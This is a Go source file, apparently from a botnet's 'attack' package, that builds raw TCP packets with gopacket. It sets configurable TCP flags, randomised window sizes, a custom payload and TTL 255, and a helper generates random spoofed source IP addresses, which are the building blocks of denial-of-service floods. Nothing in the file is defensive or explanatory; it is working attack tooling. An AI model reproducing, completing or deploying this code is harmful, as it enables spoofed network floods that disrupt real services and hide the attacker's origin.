package attack

import (
	"bot/lib/utils"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"net"
	"strconv"
)

func setupOpt() (gopacket.SerializeBuffer, *gopacket.SerializeOptions) {
	buffer := gopacket.NewSerializeBuffer()
	opts := &gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	return buffer, opts
}

func setupIPv4(srcv4, dstv4 net.IP, protov4 layers.IPProtocol) *layers.IPv4 {
	ipv4 := &layers.IPv4{
		SrcIP:    srcv4,
		DstIP:    dstv4,
		Version:  4,
		TTL:      255,
		Protocol: protov4,
	}
	return ipv4
}

func (a *Attack) setupTCP(tcpSrc, tcpDst *net.TCPAddr) []byte {
	sBuffer, sOpt := setupOpt()

	tcpv4 := setupIPv4(tcpSrc.IP.To4(), tcpDst.IP.To4(), layers.IPProtocolTCP)
	setWin, _ := strconv.ParseUint(utils.GenRange(65535, 25), 0, 16)

	tcpLayers := &layers.TCP{
		SrcPort: layers.TCPPort(tcpSrc.Port),
		DstPort: layers.TCPPort(tcpDst.Port),
		Window:  uint16(setWin),
		SYN:     a.Method.Flags.synFlag,
		ACK:     a.Method.Flags.ackFlag,
		RST:     a.Method.Flags.rstFlag,
		PSH:     a.Method.Flags.pshFlag,
		FIN:     a.Method.Flags.finFlag,
		URG:     a.Method.Flags.urgFlag,
	}

	tcpLayers.SetNetworkLayerForChecksum(tcpv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, tcpv4, tcpLayers, gopacket.Payload(a.Method.Payload))

	return sBuffer.Bytes()
}

func (a *Attack) randSrcIP() string {
	return fmt.Sprintf("%s.%s.%s.%s", utils.GenRange(90, 1), utils.GenRange(254, 1), utils.GenRange(254, 1), utils.GenRange(254, 1))
}
